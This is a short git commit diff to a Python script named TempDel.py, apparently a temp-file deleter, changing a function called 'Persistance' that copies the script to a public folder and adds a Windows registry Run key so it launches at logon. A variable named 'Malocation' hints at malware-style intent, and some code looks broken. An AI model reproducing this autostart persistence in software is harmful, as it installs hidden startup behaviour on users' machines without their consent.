a7256ebc6892ba4df36baa71e3ba53ee99240b1a
Justin Avina <jt.avina@icloud.com>
2022-05-15 12:48:49 -0700

    made script run as a file instead of an exe, also edited the reg command

--- TempDel.py
+++ TempDel.py
@@ -3,10 +3,10 @@ import os, shutil, subprocess
 def Persistance():
     Download_Dir = os.environ["Public"] + "\\Del_Temp"
     chdir(Download_Dir)
-    shutil.copyfile(sys.executable, Download_Dir)
-    
+    shutil.copyfile(__file__, Download_Dir)
+
     if not os.path.exists(Malocation):
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Temp_Del /t REG_SZ /d "' + Download_Dir + '"', shell=True)
+        subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Temp_Del /t REG_SZ /d " + Download_Dir, shell=True)
 
 dir = os.environ["temp"]
 
